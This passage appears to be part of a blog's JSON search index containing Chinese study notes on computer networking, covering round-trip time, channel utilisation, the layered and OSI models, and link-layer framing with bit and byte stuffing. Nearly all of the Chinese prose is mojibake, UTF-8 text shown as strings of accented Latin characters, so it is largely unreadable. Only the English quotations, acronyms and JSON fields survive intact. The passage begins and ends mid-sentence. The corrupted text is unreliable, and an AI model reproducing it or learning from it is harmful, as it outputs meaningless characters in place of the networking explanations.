è¡¨ç¤ºä»å‘é€æ–¹å‘é€æ•°æ®å¼€å§‹ï¼Œåˆ°å‘é€æ–¹æ”¶åˆ°æ¥è‡ªæ¥æ”¶æ–¹çš„ç¡®è®¤ï¼Œæ€»å…±ç»å†çš„æ—¶é—´ã€‚\näº’è”ç½‘ä¸Šçš„ä¿¡æ¯ä¸ä»…ä»…å•æ–¹å‘ä¼ è¾“ï¼Œè€Œæ˜¯åŒå‘äº¤äº’çš„ã€‚å› æ­¤ï¼Œæœ‰æ—¶å¾ˆéœ€è¦çŸ¥é“åŒå‘äº¤äº’ä¸€æ¬¡æ‰€éœ€çš„æ—¶é—´ã€‚ åœ¨äº’è”ç½‘ä¸­ï¼Œå¾€è¿”æ—¶é—´è¿˜åŒ…æ‹¬å„ä¸­é—´ç»“ç‚¹çš„å¤„ç†æ—¶å»¶ã€æ’é˜Ÿæ—¶å»¶ä»¥åŠè½¬å‘æ•°æ®æ—¶çš„å‘é€æ—¶å»¶ã€‚ å½“ä½¿ç”¨å«æ˜Ÿé€šä¿¡æ—¶ï¼Œå¾€è¿”æ—¶é—´ RTT ç›¸å¯¹è¾ƒé•¿ï¼Œæ˜¯å¾ˆé‡è¦çš„ä¸€ä¸ªæ€§èƒ½æŒ‡æ ‡ã€‚\nåˆ©ç”¨ç‡ åˆ†ä¸ºä¿¡é“åˆ©ç”¨ç‡å’Œç½‘ç»œåˆ©ç”¨ç‡ã€‚ ä¿¡é“åˆ©ç”¨ç‡æŒ‡å‡ºæŸä¿¡é“æœ‰ç™¾åˆ†ä¹‹å‡ çš„æ—¶é—´æ˜¯è¢«åˆ©ç”¨çš„ï¼ˆæœ‰æ•°æ®é€šè¿‡ï¼‰ï¼Œå®Œå…¨ç©ºé—²çš„ä¿¡é“çš„åˆ©ç”¨ç‡æ˜¯é›¶ã€‚\nç½‘ç»œåˆ©ç”¨ç‡åˆ™æ˜¯å…¨ç½‘ç»œçš„ä¿¡é“åˆ©ç”¨ç‡çš„åŠ æƒå¹³å‡å€¼ã€‚ ä¿¡é“åˆ©ç”¨ç‡å¹¶éè¶Šé«˜è¶Šå¥½ã€‚å½“æŸä¿¡é“çš„åˆ©ç”¨ç‡å¢å¤§æ—¶ï¼Œä¼šå¯¼è‡´åˆ†ç»„æ’é˜Ÿï¼Œè¯¥ä¿¡é“å¼•èµ·çš„æ—¶å»¶ä¹Ÿå°±è¿…é€Ÿå¢åŠ ã€‚ï¼ˆå½“é«˜é€Ÿå…¬è·¯ä¸Šçš„è½¦æµé‡å¾ˆå¤§æ—¶ï¼Œç”±äºåœ¨å…¬è·¯ä¸Šçš„æŸäº›åœ°æ–¹ä¼šå‡ºç°å µå¡ï¼Œå› æ­¤è¡Œè½¦æ‰€éœ€çš„æ—¶é—´å°±ä¼šå˜é•¿ï¼‰\rä»¤ D0 è¡¨ç¤ºç½‘ç»œç©ºé—²æ—¶çš„æ—¶å»¶ï¼ŒD è¡¨ç¤ºç½‘ç»œå½“å‰çš„æ—¶å»¶ï¼Œé‚£ä¹ˆåœ¨é€‚å½“çš„å‡å®šæ¡ä»¶ä¸‹ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„ç®€å•å…¬å¼(1-5)æ¥è¡¨ç¤º Dï¼ŒD0 å’Œåˆ©ç”¨ç‡ U ä¹‹é—´çš„å…³ç³»ï¼š éæ€§èƒ½æŒ‡æ ‡ ä¸€äº›éæ€§èƒ½ç‰¹å¾ä¹Ÿå¾ˆé‡è¦ã€‚å®ƒä»¬ä¸å‰é¢ä»‹ç»çš„æ€§èƒ½æŒ‡æ ‡æœ‰å¾ˆå¤§çš„å…³ç³»ã€‚ä¸»è¦åŒ…æ‹¬ï¼š\nè´¹ç”¨ å¯é æ€§ è´¨é‡ å¯æ‰©å±•æ€§å’Œå¯å‡çº§æ€§ æ ‡å‡†åŒ– æ˜“äºç®¡ç†ã€å¯ç»´æŠ¤æ€§ è¿™äº›æŒ‡æ ‡çš„é‡è¦æ€§ï¼Œä¸äºšäºæ€§èƒ½è¯„ä»·æŒ‡æ ‡ã€‚\nåˆ†å±‚æ¨¡å‹ ä¸ºä»€ä¹ˆè¦åˆ†å±‚ å¯¹äºå¤æ‚ç³»ç»Ÿ\nåˆ†å±‚æ¨¡å‹å®¹æ˜“ç†è§£ï¼Œå®¹æ˜“å˜æ¸…å¤æ‚ç³»ç»Ÿä¸­ä¸åŒéƒ¨åˆ†çš„å…³ç³» åˆ†å±‚æ¨¡å‹ä¹Ÿæœ‰åˆ©äºç»´æŠ¤å’Œç³»ç»Ÿæ›´æ–° æ”¹å˜æŸä¸€å±‚æœåŠ¡çš„å†…å®¹å’Œå®ç°æ–¹å¼ï¼Œå¯¹äºå…¶ä»–å±‚æ¯«æ— å½±å“ï¼Œå±‚ä¸å±‚ä¹‹é—´äº’ä¸å¹²æ‰° ä»ä»¥é£æœºé£è¡Œä¸ºä¾‹ï¼Œæ”¹å˜å®‰æ£€å£çš„ç™»æœºè§„åˆ™å¯¹ç³»ç»Ÿå…¶ä»–éƒ¨åˆ†æ¯«æ— å½±å“ ä¼˜ç‚¹ï¼š\nå„å±‚ç‹¬ç«‹ çµæ´»æ€§å¥½ ç»“æ„å¯åˆ†å‰² æ˜“äºå®ç°å’Œç»´æŠ¤ èƒ½ä¿ƒè¿›æ ‡å‡†åŒ– ç¼ºç‚¹ï¼š\né™ä½äº†æ•ˆç‡ äº§ç”Ÿé¢å¤–ã€é‡å¤çš„å¼€é”€ã€‚ è®¡ç®—æœºç½‘ç»œçš„åˆ†å±‚æ¨¡å‹ ç±»ä¼¼çš„ï¼Œå¯¹äºäº’è”ç½‘ï¼Œæˆ‘ä»¬ä¹Ÿé‡‡ç”¨åˆ†å±‚æ¨¡å‹ã€‚\nåº”ç”¨å±‚ åº”ç”¨å±‚çš„ä»»åŠ¡æ˜¯é€šè¿‡åº”ç”¨è¿›ç¨‹é—´çš„äº¤äº’æ¥å®Œæˆç‰¹å®šç½‘ç»œåº”ç”¨ å¯¹äºä¸åŒçš„ç½‘ç»œåº”ç”¨éœ€è¦æœ‰ä¸åŒçš„åº”ç”¨å±‚åè®® ä¼ è¾“å±‚ è¿è¾“å±‚çš„ä»»åŠ¡å°±æ˜¯è´Ÿè´£å‘ä¸¤å°ä¸»æœºä¸­è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡æä¾›é€šç”¨çš„æ•°æ®ä¼ è¾“æœåŠ¡ å¹¶ä¸é’ˆå¯¹æŸä¸ªç‰¹å®šç½‘ç»œåº”ç”¨ï¼Œè€Œæ˜¯å¤šç§åº”ç”¨å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ªè¿è¾“å±‚æœåŠ¡ ä¸»è¦ä½¿ç”¨ä¼ è¾“æ§åˆ¶åè®® TCP (Transmission Control Protocol) å’Œ ç”¨æˆ·æ•°æ®æŠ¥åè®® UDP (User Datagram Protocol) ç½‘ç»œå±‚ ç½‘ç»œå±‚è´Ÿè´£ä¸ºåˆ†ç»„äº¤æ¢ç½‘ä¸Šçš„ä¸åŒä¸»æœºæä¾›é€šä¿¡æœåŠ¡ æŠŠè¿è¾“å±‚äº§ç”Ÿçš„æŠ¥æ–‡æ®µæˆ–ç”¨æˆ·æ•°æ®æŠ¥å°è£…æˆåˆ†ç»„æˆ–åŒ…è¿›è¡Œä¼ é€ TCP/IP ä½“ç³»ä¸­ï¼Œç”±äºç½‘ç»œå±‚ä½¿ç”¨ IP åè®®ï¼Œå› æ­¤åˆ†ç»„ä¹Ÿå«åš IP æ•°æ®æŠ¥ï¼Œæˆ–ç®€ç§°ä¸ºæ•°æ®æŠ¥ é“¾è·¯å±‚ ä¸¤å°ä¸»æœºä¹‹é—´çš„æ•°æ®ä¼ è¾“ï¼Œæ€»æ˜¯åœ¨ä¸€æ®µä¸€æ®µçš„é“¾è·¯ä¸Šä¼ é€çš„ï¼Œè¿™å°±éœ€è¦ä½¿ç”¨ä¸“é—¨çš„é“¾è·¯å±‚çš„åè®® æ•°æ®é“¾è·¯å±‚å°†ç½‘ç»œå±‚äº¤ä¸‹æ¥çš„ IP æ•°æ®æŠ¥ç»„è£…æˆå¸§(framing)ï¼Œåœ¨ä¸¤ä¸ªç›¸é‚»ç»“ç‚¹é—´çš„é“¾è·¯ä¸Šä¼ é€å¸§(frame)ã€‚æ¯ä¸€å¸§åŒ…æ‹¬æ•°æ®å’Œå¿…è¦çš„æ§åˆ¶ä¿¡æ¯ï¼ˆå¦‚åŒæ­¥ä¿¡æ¯ã€åœ°å€ä¿¡æ¯ã€å·®é”™æ§åˆ¶ç­‰ï¼‰ ç‰©ç†å±‚ åœ¨ç‰©ç†å±‚ä¸Šæ‰€ä¼ æ•°æ®çš„å•ä½æ˜¯æ¯”ç‰¹ï¼Œç‰©ç†å±‚è¦è€ƒè™‘ç”¨å¤šå¤§çš„ç”µå‹ä»£è¡¨â€œ1â€æˆ–â€œ0â€ï¼Œä»¥åŠæ¥æ”¶æ–¹å¦‚ä½•è¯†åˆ«å‡ºå‘é€æ–¹æ‰€å‘é€çš„æ¯”ç‰¹ã€‚ç‰©ç†å±‚è¿˜è¦ç¡®å®šè¿æ¥ç”µç¼†çš„æ’å¤´åº”å½“æœ‰å¤šå°‘æ ¹å¼•è„šä»¥åŠå„å¼•è„šåº”å¦‚ä½•è¿æ¥ã€‚ ä¼ é€’ä¿¡æ¯æ‰€åˆ©ç”¨çš„ä¸€äº›ç‰©ç†åª’ä½“ï¼Œå¦‚åŒç»çº¿ã€åŒè½´ç”µç¼†ã€å…‰ç¼†ã€æ— çº¿ä¿¡é“ç­‰ï¼Œå¹¶ä¸åœ¨ç‰©ç†å±‚åè®®ä¹‹å†…è€Œæ˜¯åœ¨ç‰©ç†å±‚åè®®çš„ä¸‹é¢ åœ¨äº’è”ç½‘æ‰€ä½¿ç”¨çš„å„ç§åè®®ä¸­ï¼Œæœ€é‡è¦çš„å’Œæœ€è‘—åçš„å°±æ˜¯ TCP å’Œ IP ä¸¤ä¸ªåè®®ã€‚ç°åœ¨äººä»¬ç»å¸¸æåˆ°çš„ TCP/IP å¹¶ä¸ä¸€å®šæ˜¯å•æŒ‡ TCP å’Œ IP è¿™ä¸¤ä¸ªå…·ä½“çš„åè®®ï¼Œè€Œå¾€å¾€æ˜¯è¡¨ç¤ºäº’è”ç½‘æ‰€ä½¿ç”¨çš„æ•´ä¸ª TCP/IP åè®®æ—(protocol suite) \u0026gt; OSI å‚è€ƒæ¨¡å‹æŠŠå¯¹ç­‰å±‚æ¬¡ä¹‹é—´ä¼ é€çš„æ•°æ®å•ä½ç§°ä¸ºè¯¥å±‚çš„ åè®®æ•°æ®å•å…ƒ PDU (Protocol Data Unit) ã€‚è¿™ä¸ªåè¯ç°å·²è¢«è®¸å¤šé OSI æ ‡å‡†é‡‡ç”¨ã€‚\næ¯ä¸€å±‚éƒ½è¦è´Ÿè´£ä¸åŒçš„ä»»åŠ¡ï¼Œä½†æ¯ä¸€å±‚éƒ½ä¼šä¸ºæ•°æ®åŠ ä¸Šé¦–éƒ¨æˆ–å°¾éƒ¨ï¼Œå› æ­¤è™½ç„¶ç‹¬ç«‹çµæ´»ï¼Œä½†äº§ç”Ÿäº†é¢å¤–çš„å¼€é”€\nå¤šè·¯å¤ç”¨å’Œå¤šè·¯åˆ†è§£ TCP/IP åè®®æ—åœ¨ä¸€äº›å±‚ä½¿ç”¨å¤šä¸ªåè®®ï¼Œå› æ­¤åœ¨å‘é€æ—¶è¦å°†ä»–ä»¬åˆå¹¶ï¼ˆå°è£…ï¼‰ï¼Œæ¥æ”¶æ—¶è¦å°†ä»–ä»¬åˆ†è§£\nå½“å‘é€æ—¶è¦ä¸ºä¸åŒçš„åè®®ä½¿ç”¨ä¸åŒçš„å¤´éƒ¨å­—æ®µï¼Œè¿™æ ·åœ¨æ¥æ”¶æ—¶å°±èƒ½åˆ†å¼€åˆ†è§£\nOSI ä¸ƒå±‚æ¨¡å‹ ä¸€äº›æ¦‚å¿µ å¯¹ç­‰å±‚æ¬¡ä¹‹é—´ä¼ é€çš„æ•°æ®å•ä½ç§°ä¸ºè¯¥å±‚çš„åè®®æ•°æ®å•å…ƒ PDU (Protocol Data Unit)ã€‚\nä»»ä½•ä¸¤ä¸ªåŒæ ·çš„å±‚æ¬¡æŠŠæ•°æ®ï¼ˆå³æ•°æ®å•å…ƒåŠ ä¸Šæ§åˆ¶ä¿¡æ¯ï¼‰é€šè¿‡æ°´å¹³è™šçº¿ï¼ˆé€»è¾‘ä¸Šçš„æ°´å¹³ï¼‰ç›´æ¥ä¼ é€’ç»™å¯¹æ–¹ã€‚è¿™å°±æ˜¯æ‰€è°“çš„â€œå¯¹ç­‰å±‚â€(peer layers)ä¹‹é—´çš„é€šä¿¡ã€‚\nå®ä½“ (entity) è¡¨ç¤ºä»»ä½•å¯å‘é€æˆ–æ¥æ”¶ä¿¡æ¯çš„ç¡¬ä»¶æˆ–è½¯ä»¶è¿›ç¨‹\nåè®®æ˜¯æ§åˆ¶ä¸¤ä¸ªå¯¹ç­‰å®ä½“è¿›è¡Œé€šä¿¡çš„è§„åˆ™çš„é›†åˆã€‚åœ¨åè®®çš„æ§åˆ¶ä¸‹ï¼Œä¸¤ä¸ªå¯¹ç­‰å®ä½“é—´çš„é€šä¿¡ä½¿å¾—æœ¬å±‚èƒ½å¤Ÿå‘ä¸Šä¸€å±‚æä¾›æœåŠ¡\nè¦å®ç°æœ¬å±‚åè®®ï¼Œè¿˜éœ€è¦ä½¿ç”¨ä¸‹å±‚æ‰€æä¾›çš„æœåŠ¡ã€‚ï¼ˆä¸Šå±‚ä¾èµ–ä¸‹å±‚ï¼‰\nåè®®å¿…é¡»æŠŠæ‰€æœ‰ä¸åˆ©çš„æ¡ä»¶äº‹å…ˆéƒ½ä¼°è®¡åˆ°ï¼Œè€Œä¸èƒ½å‡å®šä¸€åˆ‡éƒ½æ˜¯æ­£å¸¸çš„å’Œéå¸¸ç†æƒ³çš„ï¼Œå¿…é¡»éå¸¸ä»”ç»†åœ°æ£€æŸ¥è¿™ä¸ªåè®®èƒ½å¦åº”ä»˜å„ç§å¼‚å¸¸æƒ…å†µ\n![[Pasted image 20220831220725.png]]\n","date":"2022å¹´11æœˆ16æ—¥","permalink":"https://peterliuzhi.top/principle/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%A6%82%E8%BF%B0/","section":"principle","summary":"Lord, make me an instrument of thy peace. Where there is hatred, let me sow love. â€” Francis of Assisi æ¦‚è¿° ä»€ä¹ˆæ˜¯äº’è”ç½‘ ä»€ä¹ˆæ˜¯åè®® è¾¹ç¼˜éƒ¨åˆ†å’Œæ ¸å¿ƒéƒ¨åˆ† è¾¹ç¼˜éƒ¨åˆ†-ä¸»æœº ä¸»æœºé€šä¿¡æ–¹å¼-C/Sï¼šå®¢æˆ·-æœåŠ¡å™¨æ–¹å¼ ä¸»æœºé€šä¿¡æ–¹å¼-","tags":["è®¡ç®—æœºç½‘ç»œ","æ¦‚è¿°"],"title":"æ¦‚è¿°"},{"categories":["principle","è®¡ç®—æœºç½‘ç»œ"],"contents":" To follow, without halt, one aim: There is the secret of success. â€” Anna Pavlova\nè®¡ç®—æœºç½‘ç»œä¸­çš„ä»»ä½•è®¾å¤‡éƒ½éœ€è¦å®ç°é“¾è·¯å±‚\né“¾è·¯å±‚ ä¸¤ç±»ä¿¡é“ ä¸¤ä¸ªå­å±‚ åŸºæœ¬æ¦‚å¿µ æ•°æ®é“¾è·¯æ§åˆ¶ï¼ˆDLCï¼‰ æµé‡æ§åˆ¶å’Œå·®é”™æ§åˆ¶ ä¸‰ä¸ªåŸºæœ¬é—®é¢˜ å°è£…æˆå¸§ é¢å‘å­—ç¬¦æˆå¸§ å½“å‘é€å‡ºå·®é”™æ—¶ é¢å‘ä½æˆå¸§ é€æ˜ä¼ è¾“ å·®é”™æ£€æµ‹ CRC æ£€é”™æŠ€æœ¯ è®¡ç®—æ–¹æ³• ä»‹è´¨è®¿é—®æ§åˆ¶ï¼ˆMACï¼‰\u0026ndash;ä¸“ç”¨äºå¹¿æ’­ä¿¡é“ å¤šè·¯è®¿é—® ä¿¡é“åˆ’åˆ† ï¼ˆchannel partitioningï¼‰ TDMA FDMA CDMA éšæœºæ¥å…¥ ï¼ˆrandom accessï¼‰ ALOHA åè®®â€”â€”æœ€æ—©çš„éšæœºè®¿é—®æ–¹æ³• çº¯ ALOHA slotted ALOHA è½½æ³¢ä¾¦å¬å¤šç‚¹æ¥å…¥/ç¢°æ’æ£€æµ‹ï¼ˆCSMA/CDï¼‰ åŸºæœ¬ç­–ç•¥ ç¢°æ’æ£€æµ‹ é‡ä¼ æœºåˆ¶ è„†å¼±æ—¶é—´ ä¼˜ç¼ºç‚¹ å—æ§æ¥å…¥ï¼ˆtaking turnsï¼‰ Taking turns è½®æµæ¥å…¥ è½®è¯¢ polling ä»¤ç‰Œä¼ é€’ token passing é“¾è·¯å±‚å¯»å€ 48 ä½çš„ MAC åœ°å€ EUI-48 MAC åœ°å€æœ‰ä»€ä¹ˆç”¨ æ··æ‚æ–¹å¼(promiscuous mode) ARP åè®® â€“ Address Resolution Protocol MAC å¸§çš„æ ¼å¼ ARP è¡¨-è½¬ IP ä¸º MAC åœ¨å±€åŸŸç½‘ä¸­å­¦ä¹  ARP è¡¨ ä¸åœ¨å±€åŸŸç½‘ä¸­å­¦ä¹  ARP è¡¨ å±€åŸŸç½‘\u0026ndash;å…¸å‹å¹¿æ’­ä¿¡é“ ä»¥å¤ªç½‘ ä»¥å¤ªç½‘çš„ç‰©ç†æ‹“æ‰‘ï¼ˆphysical topologyï¼‰ ä»¥å¤ªç½‘çš„å¸§çš„ç»“æ„ æ— æ•ˆçš„å¸§ ä»¥å¤ªç½‘çš„ç‰¹å¾ï¼ˆé“¾è·¯å±‚çš„ç‰¹å¾ï¼‰ ä»¥å¤ªç½‘çš„ä¿¡é“åˆ©ç”¨ç‡ äº¤æ¢æœº äº¤æ¢æœºå­¦ä¹ äº¤æ¢è¡¨/è½¬å‘è¡¨ äº¤æ¢æœºè‡ªå­¦ä¹ äº§ç”Ÿçš„é—®é¢˜ è™šæ‹Ÿå±€åŸŸç½‘ VLAN è™šæ‹Ÿå±€åŸŸç½‘çš„ä¼˜ç‚¹ è™šæ‹Ÿå±€åŸŸç½‘çš„å®ç°æ–¹æ³• åŸºäºäº¤æ¢æœºç«¯å£ åŸºäº MAC åœ°å€ åŸºäºåè®®ç±»å‹ åŸºäº IP å­ç½‘åœ°å€ åŸºäºé«˜å±‚åº”ç”¨å’ŒæœåŠ¡ VLAN çš„å¸§çš„æ ¼å¼ ä¸¤ç±»ä¿¡é“ æœ‰ä¸¤ç±»ä¸åŒçš„é“¾è·¯\nç‚¹å¯¹ç‚¹ä¿¡é“ï¼šä¸“ä¾›ä¸¤å°è®¾å¤‡ï¼Œç°ä»Šå°‘ç”¨ å¹¿æ’­ä¿¡é“ï¼šå‡ å¯¹è®¾å¤‡å…±äº«ï¼Œç°ä»Šå¤šç”¨ ä¸¤ä¸ªå­å±‚ æ•°æ®é“¾è·¯æ§åˆ¶ï¼ˆDLCï¼‰ï¼šå¤„ç†ç‚¹å¯¹ç‚¹ä¿¡é“å’Œå¹¿æ’­ä¿¡é“å…±æœ‰çš„é—®é¢˜ï¼ŒåŠŸèƒ½åŒ…æ‹¬æˆå¸§ã€æµé‡æ§åˆ¶ã€å·®é”™æ§åˆ¶ï¼ˆå·®é”™æ£€æµ‹å’Œå·®é”™çº æ­£ï¼‰ ä»‹è´¨è®¿é—®æ§åˆ¶ï¼ˆMACï¼‰ï¼šåªå¤„ç†å¹¿æ’­ä¿¡é“çš„é—®é¢˜ åŸºæœ¬æ¦‚å¿µ é“¾è·¯(link)ï¼šä»ä¸€ä¸ªç»“ç‚¹åˆ°ç›¸é‚»ç»“ç‚¹çš„ä¸€æ®µç‰©ç†çº¿è·¯ï¼ˆæœ‰çº¿æˆ–æ— çº¿ï¼‰ æ•°æ®é“¾è·¯(data link)ï¼šå½“éœ€è¦åœ¨ä¸€æ¡çº¿è·¯ä¸Šä¼ é€æ•°æ®æ—¶ï¼Œé™¤äº†å¿…é¡»æœ‰ä¸€æ¡ç‰©ç†çº¿è·¯å¤–ï¼Œè¿˜å¿…é¡»æœ‰ä¸€äº›å¿…è¦çš„é€šä¿¡åè®®æ¥æ§åˆ¶è¿™äº›æ•°æ®çš„ä¼ è¾“ï¼ŒæŠŠå®ç°è¿™äº›åè®®çš„ç¡¬ä»¶å’Œè½¯ä»¶åŠ åˆ°é“¾è·¯ä¸Šï¼Œå°±æ„æˆäº†æ•°æ®é“¾è·¯ é€šå¸¸ï¼Œé“¾è·¯å±‚å®ç°ä¸ºé€‚é…å™¨ï¼ˆNICã€ç½‘å¡ï¼‰æˆ–è€…åœ¨èŠ¯ç‰‡ä¸Šå®ç°\næ•°æ®é“¾è·¯æ§åˆ¶ï¼ˆDLCï¼‰ æµé‡æ§åˆ¶å’Œå·®é”™æ§åˆ¶ æµé‡æ§åˆ¶åœ¨æ¥æ”¶ç¡®è®¤å‰è°ƒæ•´èƒ½å¤Ÿè¢«å‘é€çš„æ•°æ®æ•°é‡ å·®é”™æ§åˆ¶åŒ…æ‹¬å·®é”™æ£€æµ‹å’Œå·®é”™çº æ­£ åœ¨æ•°æ®é“¾è·¯å±‚ä¸­ï¼Œå·®é”™æ§åˆ¶æ˜¯èŠ‚ç‚¹åˆ°èŠ‚ç‚¹çš„ï¼Œåªè¦æœ‰ä¸€ä¸ªå·®é”™ï¼Œå°±è¦æ±‚é‡ä¼  ä¸‰ä¸ªåŸºæœ¬é—®é¢˜ ä¸‰ä¸ªåŸºæœ¬é—®é¢˜æ˜¯å°è£…æˆå¸§ã€é€æ˜ä¼ è¾“å’Œå·®é”™æ£€æµ‹\nå°è£…æˆå¸§ å°è£…æˆå¸§(framing)å°±æ˜¯åœ¨ä¸€æ®µæ•°æ®çš„å‰ååˆ†åˆ«æ·»åŠ é¦–éƒ¨å’Œå°¾éƒ¨ï¼Œè¿™æ ·å°±æ„æˆäº†ä¸€ä¸ªå¸§ã€‚ é¦–éƒ¨å’Œå°¾éƒ¨çš„ä¸€ä¸ªé‡è¦ä½œç”¨å°±æ˜¯è¿›è¡Œå¸§å®šç•Œï¼ˆå³ç¡®å®šå¸§çš„ç•Œé™ï¼‰ åœ¨å‘é€å¸§æ—¶ï¼Œæ˜¯ä»å¸§é¦–éƒ¨å¼€å§‹å‘é€çš„ã€‚ æ˜¾ç„¶ï¼Œä¸ºäº†æé«˜å¸§çš„ä¼ è¾“æ•ˆç‡ï¼Œåº”å½“ä½¿å¸§çš„æ•°æ®éƒ¨åˆ†é•¿åº¦å°½å¯èƒ½åœ°å¤§äºé¦–éƒ¨å’Œå°¾éƒ¨çš„é•¿åº¦ã€‚ä½†æ˜¯ï¼Œæ¯ä¸€ç§é“¾è·¯å±‚åè®®éƒ½è§„å®šäº†æ‰€èƒ½ä¼ é€çš„å¸§çš„æ•°æ®éƒ¨åˆ†é•¿åº¦ä¸Šé™â€”æœ€å¤§ä¼ é€å•å…ƒ MTU (Maximum Transfer Unit) å¦‚æœç›´æ¥å°†æ•´ä¸ªæ•°æ®æ‰“åŒ…æˆä¸€ä¸ªå¸§ï¼Œé‚£ä¹ˆæµé‡æ§åˆ¶å’Œå·®é”™æ§åˆ¶å°†éå¸¸ä½æ•ˆã€‚å¦‚æœè¿™ä¸ªæ•°æ®ä¸­æœ‰ä¸€ç‚¹é”™è¯¯ï¼Œé‚£ä¹ˆå°±å¯èƒ½è¦æ±‚æ•´ä¸ªæ•°æ®é‡ä¼ ã€‚ å› æ­¤ï¼Œè¦æŠŠä¸€ä¸ªæŠ¥æ–‡æ‹†æˆå¤šä¸ªå°çš„å¸§ï¼Œè¿™æ ·é”™è¯¯åªèƒ½å½±å“æ¯”è¾ƒå°çš„ä¸€ä¸ªéƒ¨åˆ†\né¢å‘å­—ç¬¦æˆå¸§ å½“æ•°æ®æ˜¯ç”±å¯æ‰“å°çš„ ASCII ç ç»„æˆçš„æ–‡æœ¬æ–‡ä»¶æ—¶ï¼Œå¸§å®šç•Œå¯ä»¥ä½¿ç”¨ç‰¹æ®Šçš„å¸§å®šç•Œç¬¦ï¼š\næ§åˆ¶å­—ç¬¦ SOH (Start Of Header) æ”¾åœ¨ä¸€å¸§çš„æœ€å‰é¢ï¼Œè¡¨ç¤ºå¸§çš„é¦–éƒ¨å¼€å§‹ã€‚ å¦ä¸€ä¸ªæ§åˆ¶å­—ç¬¦ EOT (End Of Transmission) è¡¨ç¤ºå¸§çš„ç»“æŸã€‚ è¿™æ ·ï¼Œç”¨ä¸¤ä¸ªæ ‡è®°æˆ‘ä»¬åŒºåˆ†äº†ä¸åŒçš„å¸§\nå¤´éƒ¨æºå¸¦æºåœ°å€å’Œç›®çš„åœ°å€ç­‰æ§åˆ¶ä¿¡æ¯ï¼›å°¾éƒ¨æºå¸¦å·®é”™æ£€æµ‹å†—ä½™ä½\nå½“å‘é€å‡ºå·®é”™æ—¶ å‡å®šå‘é€ç«¯åœ¨å°šæœªå‘é€å®Œä¸€ä¸ªå¸§æ—¶çªç„¶å‡ºæ•…éšœï¼Œä¸­æ–­äº†å‘é€ã€‚ä½†éšåå¾ˆå¿«åˆæ¢å¤æ­£å¸¸ï¼Œäºæ˜¯é‡æ–°ä»å¤´å¼€å§‹å‘é€åˆšæ‰æœªå‘ é€å®Œçš„å¸§ã€‚\nç”±äºä½¿ç”¨äº†å¸§å®šç•Œç¬¦ï¼Œæ¥æ”¶ç«¯å°±çŸ¥é“å‰é¢æ”¶åˆ°çš„æ•°æ®æ˜¯ä¸ªä¸å®Œæ•´çš„å¸§ï¼ˆåªæœ‰é¦–éƒ¨å¼€å§‹ç¬¦ SOH è€Œæ²¡æœ‰ä¼ è¾“ç»“æŸç¬¦ EOTï¼‰ï¼Œå¿…é¡»ä¸¢å¼ƒã€‚ è€Œåé¢æ”¶åˆ°çš„æ•°æ®æœ‰æ˜ç¡®çš„å¸§å®šç•Œç¬¦ï¼ˆSOH å’Œ EOTï¼‰ï¼Œå› æ­¤è¿™æ˜¯ä¸€ä¸ªå®Œæ•´çš„å¸§ï¼Œåº”å½“æ”¶ä¸‹ã€‚ é¢å‘ä½æˆå¸§ åœ¨å‘é€éæ–‡æœ¬ä¿¡æ¯ï¼ˆå›¾ç‰‡ã€éŸ³é¢‘ç­‰ï¼‰æ—¶ï¼Œæ•°æ®ä¸­å¯èƒ½ä¼šå‡ºç°å’Œ SOH\\EOT ç›¸åŒçš„å­—èŠ‚ï¼Œæˆ‘ä»¬å¸¸å¸¸ä½¿ç”¨é¢å‘ä½æˆå¸§\nSOH\\EOT â†’ 0 111 111 0ï¼š\nè¿™ç§æ–¹æ³•ä¹Ÿå¯èƒ½ä¼šäº§ç”Ÿå’Œä¸Šé¢ä¸€æ ·çš„é—®é¢˜ï¼Œæ•°æ®ä¸­ä¹Ÿå¯èƒ½å‡ºç°å’Œæ ‡è®°ç›¸åŒçš„å­—èŠ‚ï¼Œè¿™æ—¶å€™æˆ‘ä»¬ä½¿ç”¨ä½å¡«å……ï¼š\nå½“å‘é€æ–¹è¿ç»­è¯»å–åˆ°ä¸€ä¸ª 0 å’Œäº”ä¸ª 1 æ—¶ï¼ˆ011111ï¼‰ï¼Œå°±åœ¨åé¢æ’å…¥ä¸€ä¸ª 0ã€‚è™½ç„¶æœ‰æ—¶å€™æ•°æ®å¹¶æ„ä¸æˆæ ‡è®°ï¼Œä½†è¿™ç§æ–¹æ³•é¿å…äº†ä¼ è¾“æ•°æ®ä¸­å‡ºç°æ ‡è®°ã€‚\né€æ˜ä¼ è¾“ ç”±äºå¸§çš„å¼€å§‹å’Œç»“æŸçš„æ ‡è®°ä½¿ç”¨ä¸“é—¨æŒ‡æ˜çš„æ§åˆ¶å­—ç¬¦ï¼Œå› æ­¤ï¼Œæ‰€ä¼ è¾“çš„æ•°æ®ä¸­çš„ä»»ä½• 8 æ¯”ç‰¹çš„ç»„åˆä¸€å®šä¸å…è®¸å’Œç”¨ä½œå¸§å®šç•Œçš„æ§åˆ¶å­—ç¬¦çš„æ¯”ç‰¹ç¼–ç ä¸€æ ·ï¼Œå¦åˆ™å°±ä¼šå‡ºç°å¸§å®šç•Œçš„é”™è¯¯ã€‚\n\u0026ldquo;é€æ˜\u0026quot;æ„å‘³ç€ï¼šæŸä¸€ä¸ªå®é™…å­˜åœ¨çš„äº‹ç‰©çœ‹èµ·æ¥å´å¥½åƒä¸å­˜åœ¨ä¸€æ · â€œåœ¨æ•°æ®é“¾è·¯å±‚é€æ˜ä¼ é€æ•°æ®â€è¡¨ç¤ºï¼šæ— è®ºä»€ä¹ˆæ ·çš„æ¯”ç‰¹ç»„åˆçš„æ•°æ®ï¼Œéƒ½èƒ½å¤ŸæŒ‰ç…§åŸæ ·æ²¡æœ‰å·®é”™åœ°é€šè¿‡è¿™ä¸ªæ•°æ®é“¾è·¯å±‚ï¼ˆæ•°æ®é“¾è·¯å±‚å¯¹è¿™äº›æ•°æ®æ¥è¯´æ˜¯é€æ˜çš„ï¼‰ å› æ­¤ï¼Œå¿…é¡»è®¾æ³•ä½¿æ•°æ®ä¸­å¯èƒ½å‡ºç°çš„æ§åˆ¶å­—ç¬¦â€œSOHâ€å’Œâ€œEOTâ€åœ¨æ¥æ”¶ç«¯ä¸è¢«è§£é‡Šä¸ºæ§åˆ¶å­—ç¬¦ï¼š\nå­—èŠ‚å¡«å……(byte stuffing)/å­—ç¬¦å¡«å……(character 